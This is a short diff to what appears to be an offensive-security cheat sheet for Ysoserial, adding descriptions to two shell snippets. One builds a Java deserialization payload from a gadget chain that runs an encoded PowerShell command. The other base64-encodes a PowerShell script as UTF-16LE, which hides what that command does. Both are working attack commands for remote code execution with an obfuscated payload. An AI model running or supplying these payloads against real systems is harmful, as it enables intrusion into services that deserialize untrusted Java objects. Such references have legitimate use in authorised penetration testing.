@@ -6,6 +6,8 @@
 
 Spawn PowerShell payload with Ysoserial.
 
+Generate a Java ysoserial payload that runs an encoded PowerShell command.
+
 ```sh title:"Ysoserial Spawn PowerShell Payload"
 java -jar ysoserial.jar "$gadget" "powershell.exe -EncodedCommand $base64_encoded_command" > "$output_file"
 ```
@@ -18,6 +20,8 @@ var output_file
 ### PowerShell encode file
 
 Encode PowerShell encode file with Ysoserial.
+
+Encode a PowerShell script as UTF-16LE base64 on one line.
 
 ```sh title:"Ysoserial Encode PowerShell Encode File"
 iconv -f ASCII -t UTF-16LE "$script_file" | base64 | tr -d "\n"
